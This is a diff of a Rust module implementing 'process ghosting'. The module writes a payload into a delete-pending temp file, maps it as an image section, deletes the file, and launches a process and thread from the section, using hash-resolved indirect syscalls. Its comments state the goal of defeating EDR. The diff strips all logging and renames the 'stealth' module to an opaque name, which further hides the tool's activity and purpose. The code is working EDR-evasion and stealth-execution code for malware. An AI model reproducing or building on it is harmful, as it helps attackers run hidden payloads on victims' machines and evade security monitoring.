@@ -15,11 +15,11 @@
 //! 6. `NtCreateProcessEx` - Create process from section (no file backing!)
 //! 7. `NtCreateThreadEx` - Start execution at entry point
 
-use crate::stealth::windows::syscalls::{self, Syscall};
+use crate::s::windows::syscalls::{self, Syscall};
 use std::ptr;
 use std::ffi::c_void;
 use std::mem;
-use log::{info, debug, error};
+
 
 // ============================================================================
 // CONSTANTS
@@ -91,8 +91,7 @@ struct FileDispositionInformation {
 /// The payload runs from a file that doesn't exist on disk.
 /// EDR tracing the file path will get an error.
 pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
-    debug!("Process init...");
-    debug!("Payload: {} bytes", payload.len());
+
 
     // 1. Resolve all syscalls via Indirect Syscalls
     let sc_create_file = Syscall::resolve(syscalls::HASH_NT_CREATE_FILE)
@@ -110,7 +109,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
     let sc_create_thread = Syscall::resolve(syscalls::HASH_NT_CREATE_THREAD_EX)
         .ok_or("[Ghost] E07")?;
 
-    debug!("[Ghost] All syscalls resolved via Indirect Syscalls");
+
 
     // 2. Create phantom file path (in %TEMP%)
     let timestamp = std::time::SystemTime::now()
@@ -156,7 +155,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
     if status != 0 {
         return Err(format!("G01:{:X}", status));
     }
-    info!("[Ghost] Phantom file created");
+
 
     // 4. Mark file for deletion (NtSetInformationFile - Delete Pending)
     let mut disp_info = FileDispositionInformation { delete_file: 1 };
@@ -173,7 +172,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
         syscalls::syscall(&sc_close, &[h_file as usize]);
         return Err(format!("G02:{:X}", status));
     }
-    debug!("[Ghost] File marked delete-pending");
+
 
     // 5. Write payload to file (NtWriteFile)
     let status = syscalls::syscall(&sc_write_file, &[
@@ -192,7 +191,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
         syscalls::syscall(&sc_close, &[h_file as usize]);
         return Err(format!("G03:{:X}", status));
     }
-    info!("[Ghost] Payload written to phantom file");
+
 
     // 6. Create image section from file (NtCreateSection - SEC_IMAGE)
     let mut h_section: *mut c_void = ptr::null_mut();
@@ -211,11 +210,11 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
         syscalls::syscall(&sc_close, &[h_file as usize]);
         return Err(format!("G04:{:X}", status));
     }
-    info!("[Ghost] Image section created");
+
 
     // 7. Close file handle → File is DELETED from disk!
     syscalls::syscall(&sc_close, &[h_file as usize]);
-    info!("[Ghost] File handle closed - FILE DELETED FROM DISK");
+
 
     // 8. Create process from section (NtCreateProcessEx) 
     let mut h_process: *mut c_void = ptr::null_mut();
@@ -237,7 +236,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
         syscalls::syscall(&sc_close, &[h_section as usize]);
         return Err(format!("G05:{:X}", status));
     }
-    info!("[Ghost] Ghost process created (no file backing!)");
+
 
     // 9. Parse PE to get entry point RVA
     let entry_rva = get_entry_point_rva(payload)?;
@@ -248,7 +247,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
     // For maximum reliability, caller should verify via process memory query if base differs.
     let image_base: usize = get_pe_image_base(payload).unwrap_or(0x140000000);
     let entry_point = image_base + entry_rva as usize;
-    debug!("[Ghost] Entry point: 0x{:016X}", entry_point);
+
 
     // 10. Create initial thread (NtCreateThreadEx)
     let mut h_thread: *mut c_void = ptr::null_mut();
@@ -268,10 +267,9 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
     ]);
 
     if status != 0 {
-        error!("[Ghost] NtCreateThreadEx failed: 0x{:08X}", status);
-        // Process still created, just can't start thread
+        // Thread creation failed
     } else {
-        info!("[Ghost] Thread created - execution started");
+        // Thread started
     }
 
     // 11. Cleanup handles
@@ -279,7 +277,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
     syscalls::syscall(&sc_close, &[h_process as usize]);
     syscalls::syscall(&sc_close, &[h_section as usize]);
 
-    info!("[Ghost] Process Ghosting COMPLETE");
+
     Ok(())
 }
 
